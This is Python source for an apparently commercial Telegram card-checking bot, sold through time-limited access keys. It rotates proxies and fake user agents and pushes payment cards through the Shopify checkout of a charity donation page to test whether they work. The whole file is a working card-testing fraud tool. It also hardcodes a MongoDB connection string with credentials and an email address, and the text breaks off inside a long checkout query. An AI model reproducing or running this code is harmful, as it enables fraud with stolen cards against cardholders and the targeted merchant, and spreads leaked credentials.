import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import base64
import json
import uuid
import time
import asyncio
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import io
import os
from pymongo import MongoClient
from datetime import datetime, timedelta
import logging
from aiohttp_socks import ProxyConnector
from collections import namedtuple

# MongoDB Setup
MONGO_URI = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "fn_bot"
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
keys_col = db["keys"]
users_col = db["users"]
logs_col = db["logs"]
broadcast_col = db["broadcast"]
user_limits_col = db["user_limits"]
proxies_col = db["proxies"]

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# Bot Owner ID
OWNER_ID = 7593550190

# Initialize collections if not exists
existing_collections = db.list_collection_names()
collections = [keys_col, users_col, logs_col, broadcast_col, user_limits_col, proxies_col]
for col in collections:
    if col.name not in existing_collections:
        db.create_collection(col.name)

# Define named tuple for consistent returns
ShResult = namedtuple('ShResult', ['message', 'elapsed_time', 'proxy_status'])

# Proxy Manager
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.bad_proxies = set()
        self.semaphore = asyncio.Semaphore(3)  # Max 3 concurrent checks
        self.last_batch_time = 0
        self.load_proxies()

    def load_proxies(self):
        db_proxies = [p['proxy'] for p in proxies_col.find({}, {'proxy': 1}) if 'proxy' in p]
        file_proxies = []
        try:
            if os.path.exists("proxies.txt"):
                with open("proxies.txt", "r") as f:
                    file_proxies = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error loading proxies from file: {str(e)}")
        
        all_proxies = list(set(db_proxies + file_proxies))
        for proxy in file_proxies:
            if not proxies_col.find_one({"proxy": proxy}):
                proxies_col.insert_one({"proxy": proxy, "source": "file", "added_at": datetime.utcnow()})
        
        self.proxies = all_proxies
        logger.info(f"Loaded {len(self.proxies)} proxies (DB: {len(db_proxies)}, File: {len(file_proxies)})")

    async def rotate_proxy(self):
        if not self.proxies:
            return None
        current_time = time.time()
        if current_time - self.last_batch_time < 70 and len(self.proxies) - len(self.bad_proxies) < 3:
            wait_time = 70 - (current_time - self.last_batch_time)
            logger.info(f"Waiting {wait_time:.1f}s before next proxy batch")
            await asyncio.sleep(wait_time)
            self.last_batch_time = time.time()
        elif current_time - self.last_batch_time >= 70:
            self.last_batch_time = time.time()
        
        start_index = self.current_index
        while True:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            if proxy not in self.bad_proxies:
                return proxy
            if self.current_index == start_index:
                logger.warning("All proxies marked as bad, resetting bad list")
                self.bad_proxies = set()
                return self.proxies[self.current_index]

    def mark_bad(self, proxy):
        if proxy and proxy not in self.bad_proxies:
            self.bad_proxies.add(proxy)
            logger.warning(f"Marked proxy as bad: {proxy}")

# Global proxy manager
proxy_manager = ProxyManager()

def log_event(level: str, message: str, user_id: int = None):
    entry = {
        "timestamp": datetime.utcnow(),
        "level": level,
        "message": message,
        "user_id": user_id
    }
    logs_col.insert_one(entry)
    if level == "ERROR":
        logger.error(f"User {user_id}: {message}" if user_id else message)
    else:
        logger.info(f"User {user_id}: {message}" if user_id else message)

def generate_key(duration_days: int) -> str:
    key_id = str(uuid.uuid4()).split('-')[0].upper()
    key = f"FN-SHOPIFY-{key_id}"
    expiry = datetime.utcnow() + timedelta(days=duration_days)
    keys_col.insert_one({
        "key": key,
        "duration_days": duration_days,
        "created_at": datetime.utcnow(),
        "expires_at": expiry,
        "used": False
    })
    return key

def redeem_key(key: str, user_id: int) -> bool:
    key_data = keys_col.find_one({"key": key})
    if not key_data or key_data["used"]:
        return False
    expiry = datetime.utcnow() + timedelta(days=key_data["duration_days"])
    users_col.update_one(
        {"user_id": user_id},
        {"$set": {
            "expires_at": expiry,
            "key_used": key,
            "access_granted": True
        }},
        upsert=True
    )
    keys_col.update_one(
        {"key": key},
        {"$set": {"used": True, "used_by": user_id, "used_at": datetime.utcnow()}}
    )
    return True

def has_valid_access(user_id: int) -> bool:
    user = users_col.find_one({"user_id": user_id})
    if not user or "expires_at" not in user:
        return False
    return user["expires_at"] > datetime.utcnow()

def can_user_check_more(user_id: int, card_count: int) -> bool:
    user_limit = user_limits_col.find_one({"user_id": user_id})
    current_time = datetime.utcnow()
    if not user_limit:
        user_limits_col.insert_one({
            "user_id": user_id,
            "last_check_time": current_time,
            "cards_checked": card_count
        })
        return True
    if (current_time - user_limit["last_check_time"]) > timedelta(minutes=5):
        user_limits_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "last_check_time": current_time,
                "cards_checked": card_count
            }}
        )
        return True
    if user_limit["cards_checked"] + card_count <= 1500:
        user_limits_col.update_one(
            {"user_id": user_id},
            {"$set": {"last_check_time": current_time},
             "$inc": {"cards_checked": card_count}}
        )
        return True
    return False

def get_user_wait_time(user_id: int) -> int:
    user_limit = user_limits_col.find_one({"user_id": user_id})
    if not user_limit:
        return 0
    time_passed = (datetime.utcnow() - user_limit["last_check_time"]).total_seconds()
    return int(max(300 - time_passed, 0))

def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

def parse_card(card_input: str):
    try:
        parts = card_input.strip().split("|")
        if len(parts) < 4:
            return None, None, None, None
        cc_raw = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        cc = " ".join([cc_raw[i:i+4] for i in range(0, len(cc_raw), 4)])
        mm = str(int(mm))
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return None, None, None, None
        return cc, mm, yy, cvc
    except (ValueError, IndexError):
        return None, None, None, None

emails = ["nicochan275@gmail.com"]
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]

async def sh(card_input: str):
    start_time = time.time()
    cc, mm, yy, cvc = parse_card(card_input.strip())
    if not all([cc, mm, yy, cvc]):
        return ShResult("Invalid card format.", 0, "N/A")
    
    full_card = f"{cc.replace(' ', '')}|{mm}|{yy}|{cvc}"
    ua = UserAgent()
    user_agent = ua.random
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)
    
    proxy = await proxy_manager.rotate_proxy()
    proxy_status = "Live"
    connector = None
    if proxy:
        try:
            if proxy.startswith("http"):
                connector = aiohttp.TCPConnector(ssl=False)
            else:
                proxy_parts = proxy.split(":")
                if len(proxy_parts) == 2:
                    connector = ProxyConnector.from_url(f"socks5://{proxy}")
                elif len(proxy_parts) == 4:
                    connector = ProxyConnector(
                        proxy_type="socks5",
                        host=proxy_parts[2],
                        port=int(proxy_parts[3]),
                        username=proxy_parts[0],
                        password=proxy_parts[1],
                        rdns=True
                    )
        except Exception as e:
            log_event("ERROR", f"Proxy connector error: {str(e)}", None)
            proxy_manager.mark_bad(proxy)
            proxy_status = "Dead"
            connector = None

    async with aiohttp.ClientSession(connector=connector) as r:
        proxy_info = f" via proxy: {proxy}" if proxy else ""
        log_event("INFO", f"Starting check for card: {full_card}{proxy_info}", None)
        
        try:
            async with r.get(f'https://bins.antipublic.cc/bins/{cc.replace(" ", "")}', timeout=15) as res:
                if res.status != 200:
                    proxy_manager.mark_bad(proxy)
                    proxy_status = "Dead"
                    return ShResult(f"BIN Lookup failed: Status {res.status}", time.time()-start_time, proxy_status)
                z = await res.json()
                bin = z['bin']
                bank = z['bank']
                brand = z['brand']
                type = z['type']
                level = z['level']
                country = z['country_name']
                flag = z['country_flag']
                currency = z['country_currencies'][0] if z['country_currencies'] else "USD"
        except Exception as e:
            proxy_manager.mark_bad(proxy)
            proxy_status = "Dead"
            return ShResult(f"BIN Lookup failed: {str(e)}", time.time()-start_time, proxy_status)

        url = "https://www.buildingnewfoundations.com/cart/add.js"
        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        data = {
            'form_type': 'product',
            'utf8': '✓',
            'id': '39555780771934',
            'quantity': '1',
            'product-id': '6630341279838',
            'section-id': 'product-template',
        }
        try:
            async with r.post(url, headers=headers, data=data, timeout=30) as response:
                if response.status != 200:
                    return ShResult(f"Initial request failed: {response.status}", time.time()-start_time, proxy_status)
        except Exception as e:
            return ShResult(f"Initial request failed: {str(e)}", time.time()-start_time, proxy_status)

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
            'user-agent': user_agent,
        }
        try:
            async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers, timeout=30) as response:
                res_json = json.loads(await response.text())
                tok = res_json['token']
        except Exception as e:
            return ShResult(f"Cart data error: {str(e)}", time.time()-start_time, proxy_status)

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/cart',
            'user-agent': user_agent,
        }
        data = {'updates[]': '1', 'checkout': 'Check out'}
        try:
            response = await r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True, timeout=30)
            text = await response.text()
            x = find_between(text, 'serialized-session-token" content="&quot;', '&quot;"')
            queue_token = find_between(text, '&quot;queueToken&quot;:&quot;', '&quot;')
            stableid = find_between(text, 'stableId&quot;:&quot;', '&quot;')
            paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        except Exception as e:
            return ShResult(f"Token extraction failed: {str(e)}", time.time()-start_time, proxy_status)

        headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/d3eb175/number-ltr.html?identifier=&locationURL=',
            'user-agent': user_agent,
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mm,
                'year': yy,
                'verification_value': cvc,
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'buildingnewfoundations.com',
        }
        try:
            async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, timeout=30) as response:
                sid = (await response.json())['id']
        except Exception as e:
            return ShResult(f"Payment session failed: {str(e)}", time.time()-start_time, proxy_status)

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'referer': 'https://www.buildingnewfoundations.com/',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x,
            'x-checkout-web-source-id': tok,
        }
        params = {'operationName': 'SubmitForCompletion'}
        json_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode 